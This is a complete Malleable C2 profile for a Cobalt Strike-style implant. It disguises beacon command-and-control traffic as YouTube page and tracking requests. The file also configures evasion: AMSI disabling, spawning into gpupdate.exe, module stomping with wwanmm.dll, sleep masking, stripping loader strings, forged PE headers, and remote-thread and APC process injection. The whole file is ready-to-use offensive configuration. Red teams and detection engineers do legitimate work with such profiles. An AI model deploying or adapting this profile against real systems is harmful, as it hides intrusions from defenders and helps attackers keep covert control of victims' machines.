#youtube video profile
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#   header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
}

http-get {
    
    set uri "/watch";
    
    client {

	header "Host" "www.youtube.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Connection" "close";
	
        
        metadata {
            base64url;
	    header "Cookie";

        }
	#you know its a cat video...
	parameter "v" "iRXJXaLV0n4";

    }

    server {

	header "Expires" "Tue, 27 Apr 1971 19:44:06 EST";
	header "P3P" "CP='This is not a P3P policy! See http://support.google.com/accounts/answer/151657?hl=en for more info.'";
	header "X-XSS-Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
	header "Strict-Transport-Security" "max-age=31536000";
	header "Cache-Control" "no-cache";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-Content-Type-Options" "nosniff";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "YouTube Frontend Proxy";
	header "Set-Cookie" "VISITOR_INFO1_LIVE=ibgrrHQDalM; path=/; domain=.youtube.com; expires=Thu, 28-Jun-2018 06:18:00 GMT; httponly";
	header "Set-Cookie" "YSC=LT4ZGGSgKoE; path=/; domain=.youtube.com; httponly";
	header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
	header "Connection" "close";
        

        output {

            base64url;

	    prepend "<!doctype html><html style='font-size: 10px;font-family: Roboto, Arial, sans-serif; background-color: #fafafa;'><head><!-- Origin Trial Token, feature = Long Task Observer, origin = https://www.youtube.com, expires = 2017-04-17 --><meta  http-equiv='origin-trial'  data-feature='Long Task Observer'  data-expires='2017-04-17'content='";

	    
	    append "'><script>>var ytcfg = {d: function() {return (window.yt && yt.config_) || ytcfg.data_ || (ytcfg.data_ = {});},get: function(k, o) {return (k in ytcfg.d()) ? ytcfg.d()[k] : o;},set: function() {var a = arguments;if (a.length > 1) {ytcfg.d()[a[0]] = a[1];} else {for (var k in a[0]) {ytcfg.d()[k] = a[0][k];}}}};window.ytcfg.set('EMERGENCY_BASE_URL', '/error_204?level=ERROR\u0026client.name=1\u0026t=jserror\u0026client.version=2.20171026');</script><link rel='shortcut icon' href='/yts/img/favicon-vfl8qSV2F.ico' type='image/x-icon' ><link rel='icon' href='/yts/img/favicon_32-vflOogEID.png' sizes='32x32' ><link rel='icon' href='/yts/img/favicon_48-vflVjB_Qk.png' sizes='48x48' ><link rel='icon' href='/yts/img/favicon_96-vflW9Ec0w.png' sizes='96x96' ><link rel='icon' href='/yts/img/favicon_144-vfliLAfaB.png' sizes='144x144' ><title>YouTube</title><script ></script><script >if (window.ytcsi) {window.ytcsi.info('st', 442, '');}</script></body></html>";
	

            print;
        }
    }
}

http-post {
    
    set uri "/ptracking";
    set verb "GET";

    client {

	header "Host" "www.youtube.com";
	header "Accept" "*/*";    
	header "Accept-Language" "en";
	header "Referer" "https://www.youtube.com/watch?v=iRXJXaLV0n4"; 
        
        output {
            base64url;
	    
	    prepend "YSC=";
	    append ";&VISITOR_INFO1_LIVE=FlV1MiJMOzU";
	    header "Cookie";


        }


        id {
            base64url;

	    parameter "cpn";

        }

	parameter "html5" "1";

    }

    server {

	header "Strict-Transport-Security" "max-age=31536000";
	header "X-XSS-Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
	header "Content-Length" "0";
	header "Cache-Control" "no-cache";
	header "Expires" "Tue, 27 Apr 1971 19:44:06 EST";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Content-Type" "video/x-flv";
	header "X-Content-Type-Options" "nosniff";
	header "Server" "YouTube Frontend Proxy";
	header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
	header "Connection" "close";
        
        
        output {
            netbios;
            print;
        }
    }
}

http-stager {

    set uri_x86 "/youtubei/v1/";
    set uri_x64 "/youtubei/V1/";


    client {

        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "X-Goog-Visitor-Id" "CgtGbFYxTWlKTU96VQ==";
        header "X-YouTube-Client-Name" "56";
        header "X-YouTube-Client-Version" "20171026";
        header "Connection" "close";
    }

    server {
        header "Cache-Control" "no-cache";
	header "Content-Type" "text/xml; charset=UTF-8";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-Content-Type-Options" "nosniff";
	header "Strict-Transport-Security" "max-age=31536000";
	header "Content-Length" "155";
	header "Expires" "Tue, 27 Apr 1971 19:44:06 EST";
	header "Date" "Fri, 27 Oct 2017 18:24:28 GMT";
	header "Server" "YouTube Frontend Proxy";
	header "X-XSS-Protection" "1; mode=block";
	header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
	header "Connection" "close";

	output {
	    print;
	}
    
    }


}

post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}

#use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
#don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
stage {
    set checksum       "0";
    set compile_time   "25 Oct 2016 01:57:23";
    set entry_point    "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	   "WWanMM.dll";
    set userwx 	   "false";
    set cleanup	   "true";
    set sleep_mask	   "true";
    set stomppe	   "true";
    set obfuscate	   "true";
    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    #obfuscate beacon before sleep.
    set sleep_mask "true";

#module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

#can set a string in the .rdata section of the beacon dll.
    #adds a zero-terminated string
    #string "something";

    #adds a string 'as-is'
    #data "something";

    #adds a wide (UTF-16LE encoded) string
    stringw "something"; 
}


#controls process injection behavior
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
